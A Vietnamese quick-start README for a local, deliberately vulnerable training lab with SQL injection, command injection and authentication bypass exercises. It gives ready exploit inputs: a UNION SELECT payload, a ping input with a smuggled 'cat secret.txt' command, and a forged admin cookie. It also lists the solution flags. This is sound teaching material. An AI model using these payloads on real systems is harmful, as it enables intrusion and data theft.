# 🚀 Hướng Dẫn Nhanh

## Khởi động dự án

```bash
npm install
npm start
```

## Truy cập

-   **Trang chủ**: http://localhost:3000
-   **SQL Injection Lab**: http://localhost:3000/lab/sqli
-   **Command Injection Lab**: http://localhost:3000/lab/cmdi
-   **Authentication Bypass Lab**: http://localhost:3000/lab/auth

## Những gì bạn sẽ thấy

### 1. Trang chủ (/)

-   Danh sách các lab bảo mật
-   Click vào "SQL Injection" để bắt đầu

### 2. Trang SQL Injection Lab (/lab/sqli)

**Hiển thị ngay:**

-   ✅ Tất cả 5 title từ bảng posts
-   ✅ Thanh tìm kiếm
-   ✅ Gợi ý khai thác
-   ✅ Hướng dẫn chi tiết

**Danh sách posts mặc định:**

1. ID: 1 - Chào mừng đến với Security Lab
2. ID: 2 - SQL Injection là gì?
3. ID: 3 - Bảo mật web căn bản
4. ID: 4 - OWASP Top 10
5. ID: 5 - Cross-Site Scripting (XSS)

## Thử ngay

### Tìm kiếm bình thường

```
SQL
```

→ Kết quả: 1 bài viết

### Khai thác SQL Injection

```
' UNION SELECT id, flag FROM secret--
```

→ Kết quả: Lấy được FLAG!

## Cấu trúc Database

### 3 bảng có sẵn:

-   **posts** (5 bài viết)
-   **users** (3 users)
-   **secret** (1 flag)

## 🎯 Mục tiêu

### SQL Injection Lab

Tìm flag ẩn: `FLAG{SQL_1nj3ct10n_M4st3r}`

### Command Injection Lab

Tìm flag ẩn: `FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}`

### Authentication Bypass Lab

Tìm flag ẩn: `FLAG{4uth_Byp4ss_C00k13_H4ck}`

## 🚀 Quick Exploits

### Command Injection

#### Test bình thường:

```
8.8.8.8
```

#### Khai thác để lấy FLAG:

```
8.8.8.8; cat secret.txt
```

### Authentication Bypass

#### Đăng nhập test:

```
user1 / password1
```

#### Bypass để lấy FLAG:

1. Login với user1
2. F12 → Application → Cookies
3. Sửa cookie `auth` thành: `admin:admin123`
4. Refresh trang → Xem comment của admin

## 📖 Tài liệu đầy đủ

-   `README.md` - Tài liệu tổng quan
-   `DEMO.md` - Hướng dẫn SQL Injection chi tiết
-   `CMDI-GUIDE.md` - Hướng dẫn Command Injection chi tiết
-   `AUTH-GUIDE.md` - Hướng dẫn Authentication Bypass chi tiết
-   `CHANGELOG.md` - Lịch sử thay đổi
